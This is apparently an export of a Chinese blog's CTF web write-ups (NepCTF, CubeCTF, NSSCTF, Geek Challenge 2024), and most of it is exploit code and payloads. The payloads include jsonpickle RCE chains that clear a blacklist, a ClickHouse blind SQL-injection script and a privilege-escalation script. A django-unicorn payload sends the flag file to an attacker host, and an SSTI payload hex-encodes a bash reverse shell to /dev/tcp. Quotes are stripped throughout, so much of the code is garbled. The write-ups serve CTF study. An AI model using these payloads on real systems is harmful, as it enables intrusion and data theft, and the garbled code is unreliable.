O:9:catalogue:2:s:5:class;s:13:SplFileObject;s:4:data;s:5:/flag;O:9:catalogue:2:s:5:class;S:13:SplFile\\4fbject;s:4:data;s:5:/flag;O:9:catalogue:2:s:5:class;S:13:SplFileOb\\6Aect;s:4:data;s:5:/flag;O:8:passthru:2:s:1:S;S:20:\\70\\61\\73\\73\\74\\68\\72\\75\\28\\22\\63\\61\\74\\20/\\66*\\22\\29;;s:3:dir;N; 过滤类名大小写绕过 类内方法调用静态: A::test();[A,test](); 动态: A::test();[A,test](); 部分参考链接(有一些记不到了) https://drun1baby.top/2023/04/11/PHP-%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/https://chenxi9981.github.io/php%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96/https://xz.aliyun.com/news/11289","tags":["Study-Note"]},{"title":"NepCTF 2025","path":"/2025/07/29/NepCTF-WEB/","content":"JavaSeri基础的shiro反序列化 工具可以一把梭 dirsearch扫出来一个www.zip,有一堆东西，也有账密 sunxiaochuan258 NM$L@SBCNM.COM 密钥为kPH+bIxk5D2deZiIxcaaaA 解决 easyGooGooVVVY and RevengeGooGooVVVY通用poc 出题人waf没换说是 this.class.classLoader.loadClass(java.lang.Runtime) .getRuntime() .exec(env) .inputStream .text safe_bank前言:这道题很考验python代码审计的能力 需要我们自己去读源码 还有一些小小的坑点 进入题目有 和一个注册框 先注册帐号进去看看 提示我需要管理权限 authzeyJweS9vYmplY3QiOiAiX19tYWluX18uU2Vzc2lvbiIsICJtZXRhIjogeyJ1c2VyIjogInNhdXkiLCAidHMiOiAxNzUzNzkwNDM5fX0 解码得 py/object: __main__.Session, meta: user: sauy, ts: 1753790439 那我直接user改为admin 哇！是管理员面板!难道我win了吗 进去是假的flag(笑嘻了) 既然是jsonpickle 有jsonpickle反序列化这个知识点 这里我在赛中使用了很多poc 但是因为一些原因都没办法成功打通(悲) 但是知道一点waf builtins subclasses reduce system subprocess state re code os reduce import __class__ open不行 后复现参考了文章https://xz.aliyun.com/news/16133 注重看pyobject 看到 py/object: glob.glob, py/newargs: /* 没有blacklist里的 直接用这个回显error 题里面authz的结构是 py/object: __main__.Session, meta: user: sauy, ts: 1753790439 那应该是必须符合这个结构 把链子放在user处 py/object: __main__.Session, meta: user: py/object: glob.glob, py/newargs: /*, ts: 1753790439 还是回显error 正确的poc是 py/object: __main__.Session, meta: user: py/object: glob.glob, py/newargsex: [py/set:[/*],],ts:1753790439 解释： 1.使用pynewargsex py/newargs是给实现了__new__的对象用的py/newargsex是给没实现__new__的old-style class用的 2.使用set方式传 保证args, kwargs = obj[tags.NEWARGSEX]在运行时不会出错 3.json要全部都是双引号 所以这题我认为门槛挺高的,对没有过开发经验的人来说不太友好，很有国外xss的味道了(仅个人观点) 但是最后解出是40多 师傅们很强 期待看到其他师傅的解法 言归正传 使用上述正确poc后 要读readflag 读文件 py/object: linecache.getlines, py/newargs: [/flag] 读源码 py/object: __main__.Session, meta: user: py/object: linecache.getlines, py/newargsex: [py/set:[/app/app.py],],ts:1753790439 格式化后的源码 from flask import Flask, request, make_response, render_template, redirect, url_forimport jsonpickleimport base64import jsonimport osimport time# --- Flask 应用初始化 ---app = Flask(__name__)app.secret_key = os.urandom(24) # 用于会话和CSRF保护的秘钥# --- 用户账户和会话类定义 ---class Account: def __init__(self, uid, pwd): self.uid = uid self.pwd = pwdclass Session: def __init__(self, meta): self.meta = meta# --- 用户数据库（硬编码）---users_db = [ Account(admin, os.urandom(16).hex()), # 管理员账户，密码随机生成 Account(guest, guest) # 普通用户账户]# --- 用户注册辅助函数 ---def register_user(username, password): 尝试注册新用户。 如果用户名已存在，返回 False。 for acc in users_db: if acc.uid == username: return False users_db.append(Account(username, password)) return True# --- WAF 黑名单列表 ---# 包含大量用于阻止反序列化攻击的关键词FORBIDDEN = [ builtins, os, system, repr, __class__, subprocess, popen, Popen, nt, code, reduce, compile, command, pty, platform, pdb, pickle, marshal, socket, threading, multiprocessing, signal, traceback, inspect, \\\\\\\\, posix, render_template, jsonpickle, cgi, execfile, importlib, sys, shutil, state, import, ctypes, timeit, input, open, codecs, base64, jinja2, re, json, file, write, read, globals, locals, getattr, setattr, delattr, uuid, __import__, __globals__, __code__, __closure__, __func__, __self__, pydoc, __module__, __dict__, __mro__, __subclasses__, __init__, __new__]# --- Web 应用程序防火墙 (WAF) ---def waf(serialized): 检查序列化后的 JSON 字符串中是否包含任何黑名单关键词。 try: # 先解析成 Python 字典，再重新导出为字符串进行检查 data = json.loads(serialized) payload = json.dumps(data, ensure_ascii=False) # WAF检查的是这个重新dump的字符串 for bad in FORBIDDEN: if bad in payload: return bad # 如果发现黑名单关键词，返回该关键词 return None # 未发现黑名单关键词 except: return error # JSON 解析失败或waf函数内部错误# --- 路由定义 ---@app.route(/)def root(): 根页面，显示index.html return render_template(index.html)@app.route(/register, methods=[GET, POST])def register(): 用户注册页面和处理 if request.method == POST: username = request.form.get(username) password = request.form.get(password) confirm_password = request.form.get(confirm_password) if not username or not password or not confirm_password: return render_template(register.html, error=所有字段都是必填的。) if password != confirm_password: return render_template(register.html, error=密码不匹配。) if len(username) 4 or len(password) 6: return render_template(register.html, error=用户名至少需要4个字符，密码至少需要6个字符。) if register_user(username, password): return render_template(index.html, message=注册成功！请登录。) else: return render_template(register.html, error=用户名已存在。) return render_template(register.html)@app.post(/auth)def auth(): 用户认证（登录）处理 u = request.form.get(u) p = request.form.get(p) for acc in users_db: if acc.uid == u and acc.pwd == p: # 认证成功，生成会话令牌 sess_data = Session(user: u, ts: int(time.time())) token_raw = jsonpickle.encode(sess_data) # 序列化Session对象 b64_token = base64.b64encode(token_raw.encode()).decode() # Base64编码 resp = make_response(登录成功。) resp.set_cookie(authz, b64_token) # 设置认证Cookie resp.status_code = 302 resp.headers[Location] = /panel # 重定向到面板页 return resp return render_template(index.html, error=登录失败。用户名或密码无效。)@app.route(/panel)def panel(): 用户面板页面 token = request.cookies.get(authz) if not token: return redirect(url_for(root, error=缺少Token。)) try: # Base64解码Token decoded = base64.b64decode(token.encode()).decode() except: return render_template(error.html, error=Token格式错误。) # WAF检查 ban = waf(decoded) if ban: return render_template(error.html, error=f请不要黑客攻击！ban) try: # 反序列化Session对象 # safe=True 参数旨在防止不安全的构造函数调用，但并非万能 sess_obj = jsonpickle.decode(decoded, safe=True) meta = sess_obj.meta # 根据用户权限显示不同面板 if meta.get(user) != admin: return render_template(user_panel.html, username=meta.get(user)) return render_template(admin_panel.html) except Exception as e: # 捕捉反序列化或处理过程中的异常 return render_template(error.html, error=f数据解码失败。)@app.route(/vault)def vault(): 金库页面（只有管理员能访问并查看Flag） token = request.cookies.get(authz) if not token: return redirect(url_for(root)) try: decoded = base64.b64decode(token.encode()).decode() # WAF检查 if waf(decoded): return render_template(error.html, error=请不要尝试黑客攻击！) # 反序列化Session对象 sess_obj = jsonpickle.decode(decoded, safe=True) meta = sess_obj.meta # 权限检查 if meta.get(user) != admin: return render_template(error.html, error=访问被拒绝。只有管理员才能查看此页面。) # 管理员专属，显示Flag flag = NepCTFfake_flag_this_is_not_the_real_one return render_template(vault.html, flag=flag) except: # 泛型异常捕获，重定向回根页 return redirect(url_for(root))@app.route(/about)def about(): 关于页面 return render_template(about.html)# --- 应用运行 ---if __name__ == __main__: app.run(host=0.0.0.0, port=8000, debug=False) 黑名单（哎哟我。。。 FORBIDDEN = [ builtins, os, system, repr, __class__, subprocess, popen, Popen, nt, code, reduce, compile, command, pty, platform, pdb, pickle, marshal, socket, threading, multiprocessing, signal, traceback, inspect, \\\\\\\\, posix, render_template, jsonpickle, cgi, execfile, importlib, sys, shutil, state, import, ctypes, timeit, input, open, codecs, base64, jinja2, re, json, file, write, read, globals, locals, getattr, setattr, delattr, uuid, __import__, __globals__, __code__, __closure__, __func__, __self__, pydoc, __module__, __dict__, __mro__, __subclasses__, __init__, __new__] 文章上所有已知的poc都被禁了 那么肯定就要自己想办法了 这里看的是lamentxu师傅的方法 直接清除黑名单 (暴力美学 赞 list对象有个方法 clear list.clear() 调用FORBIDDEN.clear()函数 就可以将FORBIDDEN列表清空了! POC: py/object: __main__.Session, meta: user: py/object:__main__.FORBIDDEN.clear,py/newargs: [],ts:1753790439 再使用 py/object: __main__.Session, meta: user: py/object:subprocess.getoutput,py/newargs: [/readflag /app/1.txt],ts:1753790439 再去读app1.txt py/object: __main__.Session,meta: user: py/object: subprocess.getoutput,py/newargs: [cat /app/1.txt], ts: 1753446254 我难道不是sql注入天才吗挺小众的clickhouse数据库 黑名单是preg_match(/select.*from|\\(|or|and|union|except/is,$id) 这里的脚本来源于群里baozongwi师傅提供的 使用了 INTERSECT 子句 https://clickhouse.com/docs/zh/sql-reference/statements/select/intersect INTERSECT 子句仅返回来自第一个和第二个查询的结果行。这两个查询必须匹配列数、顺序和类型。`INTERSECT` 的结果可以包含重复行。 --来源clickhouse官方文档 import requestsfrom collections import dequefrom urllib.parse import urlparseimport timeimport sysfrom urllib3.exceptions import InsecureRequestWarningrequests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)# --- 配置 ---URL = https://nepctf31-syh2-6rti-hovn-hn4xv8mjt033.nepctf.com:443CHARSET = 1234567890abcdefghijklmnopqrstuvwxyzNCTF-#CHARSET = string.ascii_lowercase + string.digits + ~`!@#$%^*()+-=[]\\|,.?/_#CHARSET = string.ascii_letters + string.digits + string.punctuation# 库#payload_template = id INTERSECT FROM system.databases AS inject JOIN users ON inject.name LIKE pattern SELECT users.id, users.name, users.email, users.age# 表# payload_template = id INTERSECT FROM system.tables AS inject JOIN users ON inject.name LIKE pattern SELECT users.id, users.name, users.email, users.age WHERE inject.database=nepnep# 名# payload_template = id INTERSECT FROM system.columns AS inject JOIN users ON inject.name LIKE pattern SELECT users.id, users.name, users.email, users.age WHERE inject.table=nepnep# flag# python test2.py NepCTFpayload_template = id INTERSECT FROM nepnep.nepnep AS inject JOIN users ON inject.`51@g_ls_h3r3` LIKE pattern SELECT users.id, users.name, users.email, users.ageHOSTNAME = urlparse(URL).hostnameHEADERS = Content-Type: application/x-www-form-urlencoded, Connection: keep-alive, Host: HOSTNAME# --- 核心检测函数 ---def check(prefix, exact_match=False): 发送盲注Payload，根据响应判断条件是否为真。 返回 True 代表条件成立 (服务器返回了内容)。 返回 False 代表条件不成立 (服务器未返回内容)。 # 根据是否精确匹配，决定LIKE语句的模式 like_pattern = prefix if exact_match else fprefix% # 使用我们之前讨论并确认有效的盲注Payload格式 # 这比你提供的HTTP请求中的原始payload更可靠，因为它能清晰地返回真/假两种状态 final_payload = payload_template.format(pattern=like_pattern) data = id: final_payload try: # 添加proxies参数并禁用SSL证书验证(verify=False)以配合代理工具 response = requests.post(URL, headers=HEADERS, data=data, timeout=15, verify=False) if User_5 in response.text: return True else: return False except requests.exceptions.RequestException as e: # 网络错误等异常情况，打印错误并返回False print(f [Error] Request failed for prefix prefix: e, file=sys.stderr) return False# --- 广度优先搜索 (BFS) 算法 ---def bfs_discover(start_prefix=): 使用广度优先搜索算法来发现所有表名。 可以从一个指定的前缀开始搜索。 print(--- [ 启动广度优先(BFS)注入脚本 ] ---) queue = deque() found_names = set() # 1. 初始化队列 if start_prefix: print(f [+] 从指定前缀 start_prefix 开始搜索...) # 检查提供的前缀是否有效 if check(start_prefix): print(f - 前缀 start_prefix 有效，将其添加到队列。) queue.append(start_prefix) # 检查提供的前缀本身是否就是一个完整的表名 if check(start_prefix, exact_match=True): if start_prefix not in found_names: print(f [!] 指定的前缀本身就是一个完整名: start_prefix ) found_names.add(start_prefix) else: print(f [-] 指定的前缀 start_prefix 无效或未返回任何结果。脚本终止。) return else: # 如果未指定前缀，则从单个字符开始探测 print( [+] 正在探测第一层前缀 (所有可能的起始字符)...) for char in CHARSET: if check(char): print(f - 发现有效起始字符: char) queue.append(char) # 检查单字符本身是否就是一个完整的表名 if check(char, exact_match=True): if char not in found_names: print(f [!] 发现完整表名: char ) found_names.add(char) if not queue: print( [-] 未发现任何有效的起始字符，请检查配置或目标状态。) return # 2. 开始逐层遍历 print( [+] 开始进行广度优先遍历...) # `level` 表示当前正在处理的前缀的长度 level = len(start_prefix) if start_prefix else 1 while queue: level_size = len(queue) print(f --- 正在处理长度为 level + 1 的前缀 (当前队列中有 level_size 个待扩展前缀) ---) if level_size == 0: break for _ in range(level_size): current_prefix = queue.popleft() # 3. 扩展当前前缀，生成下一层节点 for char in CHARSET: new_prefix = current_prefix + char # 检查新生成的前缀是否存在 if check(new_prefix): print(f - 发现有效前缀: new_prefix) queue.append(new_prefix) # 4. 检查该有效前缀是否同时也是一个完整的表名 if check(new_prefix, exact_match=True): if new_prefix not in found_names: print(f [!] 发现完整表名: new_prefix ) found_names.add(new_prefix) level += 1 time.sleep(0.5) # 适当暂停，避免对服务器造成过大压力 print( --- [ BFS遍历完成 ] ---) if found_names: print( [SUCCESS] 所有发现的表名:) for name in sorted(list(found_names)): print(f - name) else: print( [-] 未能发现任何完整的表名。)# --- 脚本主入口 ---if __name__ == __main__: # 从命令行参数获取可选的起始前缀 print(f用法: python sys.argv[0] [可选的起始前缀]) start_prefix = if len(sys.argv) 1: start_prefix = sys.argv[1] print(f [*] 检测到命令行参数，将使用 start_prefix 作为起始前缀进行搜索。) else: print( [*] 未提供起始前缀，将从头开始搜索所有表名。) bfs_discover(start_prefix)","tags":["CTF-wp"]},{"title":"CubeCTF 2025","path":"/2025/07/23/cubectf2025-web/","content":"复现平台:https://gz.imxbt.cn/games/27/challenges# WorkerDB注册和登录功能点apilogin 和 apiregister 随便注册进去看看 发现role是admin结合题目描述那我们目的就是成为admin 并且已知这个题是session进行role验证 这个题我尝试了flask-unsign爆破是不行的 那jwt这条路行不通 于是尝试dirsearch 扫描出admin路径 访问提示我Access denied，登陆进去有change attribute功能点 抓包抓到一个新路由apisettingsupdate 源码 from flask import Flask, redirect, render_template, request, jsonify, session, url_forfrom multiprocessing import Lockfrom functools import wrapsimport secretsimport sqlite3import jsonimport osapp = Flask(__name__)app.secret_key = secrets.token_hex(16)ALLOWED_ATTRIBUTES = role, email, display_name, theme, language, notifications, timezone, avatar, bio, website, locationdef init_db(): conn = sqlite3.connect(database.db) c = conn.cursor() c.execute( CREATE TABLE IF NOT EXISTS users ( id INTEGER PRIMARY KEY AUTOINCREMENT, username TEXT UNIQUE NOT NULL, password TEXT NOT NULL, attributes TEXT NOT NULL ) ) c.execute(SELECT id FROM users WHERE username = ?, (admin,)) if not c.fetchone(): admin_attrs = json.dumps( role: admin, email: admin@example.com, display_name: Administrator ) admin_password = secrets.token_hex(16) c.execute(INSERT INTO users (username, password, attributes) VALUES (?, ?, ?), (admin, admin_password, admin_attrs)) print(created admin account with password:, admin_password) conn.commit() conn.close()def get_db(): conn = sqlite3.connect(database.db) conn.row_factory = sqlite3.Row return connl = Lock()def requires_auth(f): @wraps(f) def decorated(*args, **kwargs): if user_id not in session: return jsonify(error: Authentication required), 401 with l: return f(*args, **kwargs) return decorateddef has_xss(value): if not isinstance(value, str): return False return any(c in value for c in [, , , , (, ), , , =])@app.route(/api/register, methods=[POST])def api_register(): try: data = request.get_json() if not data: return jsonify(error: Invalid request), 400 username = data.get(username) password = data.get(password) if not username or not password: return jsonify(error: Invalid credentials), 400 db = get_db() cursor = db.cursor() cursor.execute(SELECT id FROM users WHERE username = ?, (username,)) if cursor.fetchone(): db.close() return jsonify(error: Username already exists), 400 attributes = json.dumps( role: user, email: , display_name: username, theme: light ) cursor.execute(INSERT INTO users (username, password, attributes) VALUES (?, ?, ?), (username, password, attributes)) db.commit() db.close() return jsonify(message: Registration successful) except sqlite3.Error: return jsonify(error: Server error), 500@app.route(/api/login, methods=[POST])def api_login(): try: data = request.get_json() if not data: return jsonify(error: Invalid request), 400 username = data.get(username) password = data.get(password) if not username or not password: return jsonify(error: Invalid credentials), 400 db = get_db() cursor = db.cursor() cursor.execute(SELECT id, attributes FROM users WHERE username = ? AND password = ?, (username, password)) user = cursor.fetchone() db.close() if user: attrs = json.loads(user[attributes]) session[user_id] = user[id] session[role] = attrs.get(role) return jsonify(message: Login successful) return jsonify(error: Invalid credentials), 401 except sqlite3.Error: return jsonify(error: Server error), 500@app.route(/api/settings/update, methods=[POST])@requires_authdef update_settings(): try: user_id = session[user_id] new_attrs = request.get_json() if not new_attrs: return jsonify(error: Invalid input), 400 db = get_db() cursor = db.cursor() cursor.execute(SELECT attributes FROM users WHERE id = ?, (user_id,)) current_attrs = json.loads(cursor.fetchone()[attributes]) temp_attrs = current_attrs.copy() for key in new_attrs: if key in current_attrs: temp_attrs[key] = None cursor.execute(UPDATE users SET attributes = ? WHERE id = ?, (json.dumps(temp_attrs), user_id)) db.commit() sanitized_attrs = for key, value in new_attrs.items(): if key in ALLOWED_ATTRIBUTES: if not has_xss(value): sanitized_attrs[key] = value cursor.execute(SELECT attributes FROM users WHERE id = ?, (user_id,)) current_attrs = json.loads(cursor.fetchone()[attributes]) final_attrs = current_attrs.copy() for key, value in sanitized_attrs.items(): final_attrs[key] = value final_attrs[role] = user cursor.execute(UPDATE users SET attributes = ? WHERE id = ?, (json.dumps(final_attrs), user_id)) db.commit() db.close() return jsonify(message: Settings updated successfully) except sqlite3.Error: return jsonify(error: Server error), 500@app.route(/api/manage/permissions, methods=[POST])@requires_authdef manage_permissions(): try: user_id = session[user_id] data = request.get_json() if not data or target_user not in data or new_role not in data: return jsonify(error: Missing required fields), 400 target_username = data[target_user] new_role = data[new_role] db = get_db() cursor = db.cursor() cursor.execute(SELECT attributes FROM users WHERE id = ?, (user_id,)) user_data = cursor.fetchone() current_user_attrs = json.loads(user_data[attributes]) if current_user_attrs.get(role) != user: cursor.execute(SELECT id, attributes FROM users WHERE username = ?, (target_username,)) target_user = cursor.fetchone() if not target_user: db.close() return jsonify(error: Target user not found), 404 target_attrs = json.loads(target_user[attributes]) target_attrs[role] = new_role cursor.execute(UPDATE users SET attributes = ? WHERE username = ?, (json.dumps(target_attrs), target_username)) db.commit() db.close() return jsonify(message: Permissions updated successfully) db.close() return jsonify(error: Access denied), 403 except sqlite3.Error: return jsonify(error: Server error), 500@app.route(/api/admin, methods=[GET])@requires_authdef admin_panel(): try: user_id = session[user_id] db = get_db() cursor = db.cursor() cursor.execute(SELECT attributes FROM users WHERE id = ?, (user_id,)) user_data = cursor.fetchone() db.close() attrs = json.loads(user_data[attributes]) if attrs.get(role) == admin: return jsonify( message: Welcome to the admin panel, flag: os.getenv(FLAG, cubeexample_flag) ) return jsonify(error: Access denied), 403 except sqlite3.Error: return jsonify(error: Server error), 500@app.get(/admin)def admin(): if session.get(user_id): return render_template(admin.html) return redirect(url_for(index))@app.get(/login)def login(): return render_template(login.html)@app.get(/register)def register(): return render_template(register.html)@app.get(/)def index(): if session.get(user_id): db = get_db() cursor = db.cursor() cursor.execute(SELECT username, attributes FROM users WHERE id = ?, (session[user_id],)) user = cursor.fetchone() db.close() return render_template(home.html, user=user[0], attributes=json.loads(user[1]), allowed_attrs=ALLOWED_ATTRIBUTES) return render_template(index.html)init_db() 最主要是apisettingsupdate 这里有可以利用的的东西 接口先提交清空字段的数据库更新，再处理并校验输入，当输入类型异常导致后续逻辑中断时，敏感字段（如 role）被永久清空而未恢复，触发权限检查逻辑缺陷。所以当我们传入[“role”] 就成功设置role为none @app.route(/api/settings/update, methods=[POST])@requires_authdef update_settings(): try: user_id = session[user_id] new_attrs = request.get_json() if not new_attrs: return jsonify(error: Invalid input), 400 db = get_db() cursor = db.cursor() cursor.execute(SELECT attributes FROM users WHERE id = ?, (user_id,)) current_attrs = json.loads(cursor.fetchone()[attributes]) temp_attrs = current_attrs.copy() for key in new_attrs: if key in current_attrs: temp_attrs[key] = None cursor.execute(UPDATE users SET attributes = ? WHERE id = ?, (json.dumps(temp_attrs), user_id)) db.commit() sanitized_attrs = for key, value in new_attrs.items(): if key in ALLOWED_ATTRIBUTES: if not has_xss(value): sanitized_attrs[key] = value cursor.execute(SELECT attributes FROM users WHERE id = ?, (user_id,)) current_attrs = json.loads(cursor.fetchone()[attributes]) final_attrs = current_attrs.copy() for key, value in sanitized_attrs.items(): final_attrs[key] = value final_attrs[role] = user cursor.execute(UPDATE users SET attributes = ? WHERE id = ?, (json.dumps(final_attrs), user_id)) db.commit() db.close() return jsonify(message: Settings updated successfully) except sqlite3.Error: return jsonify(error: Server error), 500 因为apimanagepermissions只校验是不是为user 不是user就通过 我们none 所以可以通过伪造admin if current_user_attrs.get(role) != user: cursor.execute(SELECT id, attributes FROM users WHERE username = ?, (target_username,)) target_user = cursor.fetchone() 于是脚本是: import requestsBASE = http://gz.imxbt.cn:20580/s = requests.Session()s.post(BASE + /api/register, json= username: sauy, password: 122)s.post(BASE + /api/login, json= username: sauy, password: 122)r = s.post( BASE + /api/settings/update, json=[role], headers=Content-Type: application/json)print(Step 3 status:, r.status_code)r = s.post(BASE + /api/manage/permissions, json= target_user: sauy, new_role: admin)print(Step 4 promote:, r.status_code, r.json())r = s.get(BASE + /api/admin)print(Step 5 flag:, r.status_code, r.json()) legal snacks题目描述(中文版) 我们找到了这个合法的网站，它正在销售与黑客相关的零食，但它们的一款产品定价奇怪。找出一种方法在不支付的情况下购买它。 进去就是一个类似于购物网站的东西 往下看看的个价格很离谱的东西 肯定就是要买它 余额只有100 那就想办法能不能把购买数量改为负数 前端直接改不行 抓个包看看呢 成功 那就凑到不超过100就行了 满足要求后购买 卡号要求16位全数字 todo其他的我不啰嗦了 前面的也就是输入字符限制20个字符 抓包看个传入格式为 id:7jqvVCJD,data:task:,tasks:[],checksum:Scdr22XG,actionQueue:[type:syncInput,payload:name:task,value:test1,partials:[],type:callMethod,payload:name:add,partials:[]],epoch:1753276792384,hash:3667ovLi 本题可知是django框架 考点是CVE-2025-24370 https://github.com/adamghill/django-unicorn/security/advisories/GHSA-g9wf-5777-gq43 附件里面很重要的源码 如果攻击者能够修改 settings.CONTACT_URL（例如通过序列化注入、配置修改、数据库注入等），就能将 curl 的目标指向攻击者自己的服务器。 def home(request): # todo charge users $49.99/month because greed # todo dont send the confidential flag ... system(fcurl settings.CONTACT_URL -d @/tmp/flag.txt -X GET -o /dev/null) return render(request, findex.html) poc是 type: syncInput, payload: name: __init__.__globals__.sys.modules.django.template.backends.django.settings.CONTACT_URL, value: http://your-ip:port 最后发包 POST /unicorn/message/todo HTTP/1.1Host: gz.imxbt.cn:20622Content-Length: 691Accept: application/jsonX-Requested-With: XMLHttpRequestX-CSRFTOKEN: OaW6pVSwc7zWaWovIsxPogO3TESlFCY0User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.88 Safari/537.36Content-Type: text/plain;charset=UTF-8Origin: http://gz.imxbt.cn:20622Referer: http://gz.imxbt.cn:20622/Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: csrftoken=OaW6pVSwc7zWaWovIsxPogO3TESlFCY0Connection: close id: n6m7PYbo, data: task: , tasks: [] , checksum: PXafcTdS, actionQueue: [ type: syncInput, payload: name: task, value: 12 , partials: [] , type: syncInput, payload: name: __init__.__globals__.sys.modules.django.template.backends.django.settings.CONTACT_URL, value: http://123:123 , partials: [] , type: callMethod, payload: name: add , partials: [] ], epoch: 1753284343529, hash: djXgQjG4 先服务器开始监听 然后发包 再去网页刷新就可以拿到flag了","tags":["CTF-wp"]},{"title":"关于gc回收机制在phar序列化的一次例题","path":"/2025/07/22/NSSCTF prize_p1/","content":"NSSCTF prize_p1META http-equiv=Content-Type content=text/html; charset=utf-8 /?phphighlight_file(__FILE__);class getflag function __destruct() echo getenv(FLAG); class A public $config; function __destruct() if ($this-config == w) $data = $_POST[0]; if (preg_match(/get|flag|post|php|filter|base64|rot13|read|data/i, $data)) die(我知道你想干吗，我的建议是不要那样做。); file_put_contents(./tmp/a.txt, $data); else if ($this-config == r) $data = $_POST[0]; if (preg_match(/get|flag|post|php|filter|base64|rot13|read|data/i, $data)) die(我知道你想干吗，我的建议是不要那样做。); echo file_get_contents($data); if (preg_match(/get|flag|post|php|filter|base64|rot13|read|data/i, $_GET[0])) die(我知道你想干吗，我的建议是不要那样做。);unserialize($_GET[0]);throw new Error(那么就从这里开始起航吧); 思路分析:有两个类 A是读取flag B是可以进行文件读写的功能 那我们通过上传phar文件再利用phar协议来读取 但是phar文件是明文 含有getflag也会被过滤 那就使用gzip打包 phar伪协议一样可以解析gzip bzip2 tar zip这四个后缀的文件 生成phar文件记得phar only设置为off 并且这里php环境使用的和题目环境一样的php5 ?phphighlight_file(__FILE__); class getflag $phar = new Phar(test.phar);$phar-startBuffering();$phar-setStub(?php __HALT_COMPILER(); ?);$o = new getflag();$o = array(0=$o,1=null);$phar-setMetadata($o);$phar-addFromString(test.txt, test);$phar-stopBuffering(); 那么这里生成的phar文件我们需要绕过throw new Error(“那么就从这里开始起航吧”); 这里就运用到了gc回收机制 修改phar文件 将1替换为0 a:2:i:0;O:7:getflag:i:0;N; Array[0]首先是设置为getflag对象的，然后又将Array[0]赋值为NuLL，那么原来的getflag就没有被引用了 触发了gc回收机制 __destruct被提前触发 重新签名修改过后的phar文件需要重新签名 from hashlib import sha1f = open(./test.phar, rb).read() # 修改内容后的phar文件s = f[:-28] # 获取要签名的数据h = f[-8:] # 获取签名类型以及GBMB标识newf = s+sha1(s).digest()+h # 数据 + 签名 + 类型 + GBMBopen(ph2.phar, wb).write(newf) # 写入新文件 读取flag然后上传文件进行读取操作 import requestsimport reimport gzipurl = http://node4.anna.nssctf.cn:28318/### 先将phar文件变成gzip文件with open(./ph2.phar, rb) as f1: phar_zip = gzip.open(gzip.zip, wb) # 创建了一个gzip文件的对象 phar_zip.writelines(f1) # 将phar文件的二进制流写入 phar_zip.close()###写入gzip文件with open(gzip.zip, rb) as f2: data1 = 0: f2.read() # 利用gzip后全是乱码绕过 param1 = 0: O:1:A:1:s:6:config;s:1:w; p1 = requests.post(url=url, params=param1, data=data1)### 读gzip.zip文件，获取flagparam2 = 0: O:1:A:1:s:6:config;s:1:r;data2 = 0: phar://tmp/a.txtp2 = requests.post(url=url, params=param2, data=data2)flag = re.compile(NSSCTF\\.*?\\).findall(p2.text)print(flag)","tags":["CTF-wp"]},{"title":"极客大挑战2024-web","path":"/2025/07/17/极客大挑战2024-WEB/","content":"ezpopphp反序列化 ?phpClass SYC public $starven; public function __call($name, $arguments) if(preg_match(/%|iconv|UCS|UTF|rot|quoted|base|zlib|zip|read/i,$this-starven)) die(no hack); file_put_contents($this-starven,?php exit();.$this-starven); Class lover public $J1rry; public $meimeng; public function __destruct() if(isset($this-J1rry)file_get_contents($this-J1rry)==Welcome GeekChallenge 2024) echo success; $this-meimeng-source; public function __invoke() echo $this-meimeng; Class Geek public $GSBP; public function __get($name) $Challenge = $this-GSBP; return $Challenge(); public function __toString() $this-GSBP-Getflag(); return Just do it; if($_GET[data]) if(preg_match(/meimeng/i,$_GET[data])) die(no hack); unserialize($_GET[data]);else highlight_file(__FILE__); 考点是exit死亡绕过,这里正则过滤了很多编码方式如果没有过滤%还可以使用二次编码绕过，但是这里过滤了,还可以用.htaccess进行预包含，然后读取flag。参考文章:file_put_content和死亡·杂糅代码之缘-先知社区 链子顺序很简单 lover::__destruct() → Geek::__get() → lover::__invoke() → Geek::__toString() → SYC::__call() 然后对meimeng进行了过滤,这里使用大写S即可绕过，代表解析十六进制。 ?phpClass SYC public $starven =php://filter/write=string.strip_tags/?php_value auto_prepend_file /flag #/resource=.htaccess;Class lover public $J1rry=data://text/plain,Welcome GeekChallenge 2024; public $meimeng;Class Geek public $GSBP;$exp= new lover();$exp-meimeng=new Geek();$exp-meimeng-GSBP=new lover();$exp-meimeng-GSBP-meimeng=new Geek();$exp-meimeng-GSBP-meimeng-GSBP=new SYC();$a=serialize($exp);$b=str_replace(s:7:\\meimeng\\;,S:7:\\meimen\\\\67\\;,$a);echo urlencode($b); Problem_On_My_Web留言板题目首先考虑ssti和xss，这个题有两个路由 forms提交留言 manager访问 %90xss了 scriptalert(1)/script 测试成功 我习惯使用xss平台 成功 ez_http 获取到cookie 有secret_key Starven_secret_key 改下token就对了 SecretInDrivingSchoolF12看到L000G1n.php 登录框 帐号无脑猜测admin 三位字母+@chengxing 密码爆破就是SYC@chengxing 进入管理面板 修改php源码 改为 ?echo readgzfile(/flag);? 然后去页面底部看到flag baby_upload 这样就可以绕过过滤 Can_you_Pass_Me 过滤了然后有黑名单 , [, +, %2B, %2b, read, popen, os, request, getitem, class,base,os,subclasses,getattribute,__builtins__,__globals__,get,/ 我使用的bash反弹 因为这个题是不能把flag明文直接输出到这个页面 %print (QAQ.__eq__|attr(__globals__)|attr(get)(__builtins__)).__import__(os)|attr(popen)(\\x62\\x61\\x73\\x68\\x20\\x2d\\x63\\x20\\x22\\x62\\x61\\x73\\x68\\x20\\x2d\\x69\\x20\\x3e\\x26\\x20\\x2f\\x64\\x65\\x76\\x2f\\x74\\x63\\x70\\x2f\\x34\\x37\\x2e\\x31\\x30\\x39\\x2e\\x32\\x30\\x37\\x2e\\x31\\x32\\x33\\x2f\\x31\\x32\\x33\\x34\\x20\\x30\\x3e\\x26\\x31\\x22)|attr(read)()% py_game登录进去 看到session 使用flask-unsign进行session伪造 flask-unsign --unsign --cookie eyJfZmxhc2hlcyI6W3siIHQiOlsic3VjY2VzcyIsIlx1NzY3Ylx1NWY1NVx1NjIxMFx1NTI5ZiJdfV0sInVzZXJuYW1lIjoiMTIzIn0.aHlBfg.kwGwxAHbbA0O1bn_0ZlRG-oCAmY flask-unsign --sign --cookie _flashes: [(success, 登录成功)], username: admin --secret a123456 